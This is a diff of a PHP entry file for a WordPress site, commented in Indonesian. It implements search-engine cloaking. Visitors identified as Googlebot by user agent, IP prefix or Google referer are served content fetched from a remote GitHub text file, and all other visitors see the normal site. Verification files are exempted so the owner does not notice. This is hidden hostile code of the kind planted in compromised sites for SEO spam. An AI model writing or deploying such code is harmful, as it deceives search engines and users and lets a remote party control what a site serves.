@@ -1,7 +1,28 @@
 <?php
+// ========== SKIP CLOAKING UNTUK FILE VERIFIKASI ==========
+$request_uri = $_SERVER['REQUEST_URI'] ?? '';
 
+// List file yang harus di-skip dari cloaking
+$skip_files = [
+    'google' => '/^\/google[0-9a-f]+\.html$/i',
+    'googlex' => '/^\/googlex[0-9a-f]+\.html$/i',
+    'bing' => '/^\/BingSiteAuth\.xml$/i',
+    'yandex' => '/^\/yandex_[a-z0-9]+\.html$/i',
+    'sitemap' => '/^\/sitemap.*\.xml$/i',
+    'robots' => '/^\/robots\.txt$/i',
+    'favicon' => '/^\/favicon\.ico$/i'
+];
+
+foreach ($skip_files as $pattern) {
+    if (preg_match($pattern, $request_uri)) {
+        // File verifikasi - biarkan WordPress menanganinya
+        require_once('wp-load.php');
+        exit;
+    }
+}
+
+// ========== KODE CLOAKING ANDA ==========
 $github_url = 'https://raw.githubusercontent.com/salmadev138/bankdataku/refs/heads/main/gojiberi.txt';
-
 
 $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
 $ip = $_SERVER['REMOTE_ADDR'] ?? '';
@@ -10,29 +31,13 @@ $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
 
 $show_cloak = false;
 
-
-$bot_patterns = [
-    'Googlebot', 'AdsBot-Google', 'Mediapartners-Google',
-    'Google-InspectionTool', 'Google-Site-Verification',
-    'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
-    'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
-];
-
-foreach ($bot_patterns as $pattern) {
-    if (stripos($ua, $pattern) !== false) {
-        $show_cloak = true;
-        break;
-    }
+// Deteksi Googlebot
+if (preg_match('/(Googlebot|AdsBot\-Google|Mediapartners\-Google|Google\-InspectionTool)/i', $ua)) {
+    $show_cloak = true;
 }
 
-
-$google_ips = [
-    '66.249.', '64.233.', '216.239.', '72.14.', '209.85.',
-    '108.177.', '74.125.', '216.58.', '172.217.', '142.250.',
-    '34.', '35.', '104.154.', '104.196.', '130.211.',
-    '2001:4860:', '2404:6800:', '2a00:1450:', '2607:f8b0:'
-];
-
+// Deteksi IP Google
+$google_ips = ['66.249.', '64.233.', '216.239.', '72.14.', '209.85.'];
 foreach ($google_ips as $range) {
     if (strpos($ip, $range) === 0) {
         $show_cloak = true;
@@ -40,99 +45,22 @@ foreach ($google_ips as $range) {
     }
 }
 
-
-if (!$show_cloak && function_exists('gethostbyaddr') && $ip && filter_var($ip, FILTER_VALIDATE_IP)) {
-    $hostname = @gethostbyaddr($ip);
-    if ($hostname && $hostname !== $ip) {
-        if (preg_match('/\.(googlebot|google)\.com$/i', $hostname)) {
-            $show_cloak = true;
-        }
-    }
+// Deteksi referer Google
+if (stripos($ref, 'google.') !== false) {
+    $show_cloak = true;
 }
 
-
-$search_engines = ['google.', 'bing.', 'yahoo.', 'yandex.', 'duckduckgo.'];
-foreach ($search_engines as $engine) {
-    if (stripos($ref, $engine) !== false) {
-        $show_cloak = true;
-        break;
-    }
-}
-
-
+// ========== PROSES CLOAKING ==========
 if ($show_cloak) {
-    $content = false;
-    
-    
-    if (function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt_array($ch, [
-            CURLOPT_URL => $github_url,
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_FOLLOWLOCATION => true,
-            CURLOPT_SSL_VERIFYPEER => false,
-            CURLOPT_SSL_VERIFYHOST => false,
-            CURLOPT_TIMEOUT => 15,
-            CURLOPT_CONNECTTIMEOUT => 10,
-            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        ]);
-        $content = curl_exec($ch);
-        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        curl_close($ch);
-        
-        if ($http_code != 200) {
-            $content = false;
-        }
-    }
-    
-   
-    if (!$content && ini_get('allow_url_fopen')) {
-        $context = stream_context_create([
-            'http' => ['timeout' => 15],
-            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
-        ]);
-        $content = @file_get_contents($github_url, false, $context);
-    }
-    
-    
-    if ($content && trim($content) !== '') {
-        
+    // Untuk Google, tampilkan konten cloaking
+    $content = @file_get_contents($github_url);
+    if ($content) {
         header('Content-Type: text/html; charset=UTF-8');
-        header('Cache-Control: no-cache, no-store, must-revalidate');
-        header('Pragma: no-cache');
-        header('Expires: 0');
-        
-       
         echo $content;
         exit;
     }
 }
 
-
-$request_uri = $_SERVER['REQUEST_URI'] ?? '';
-$is_wp_request = (
-    strpos($request_uri, '/wp-') === 0 ||
-    strpos($request_uri, '/wp/') !== false ||
-    strpos($request_uri, '.php') !== false ||
-    preg_match('/\.(css|js|jpg|jpeg|png|gif|ico|svg|woff|woff2|ttf|eot)$/i', $request_uri)
-);
-
-if (!$is_wp_request) {
-   
-    if (file_exists(dirname(__FILE__) . '/wp-load.php')) {
-        define('WP_USE_THEMES', true);
-        require_once(dirname(__FILE__) . '/wp-load.php');
-        
-     
-        wp();
-        
-       
-        require_once(ABSPATH . WPINC . '/template-loader.php');
-        exit;
-    }
-}
-
-
-header("Location: /", true, 302);
-exit;
+// Jika bukan Google, tampilkan WordPress biasa
+require_once('wp-load.php');
 ?>
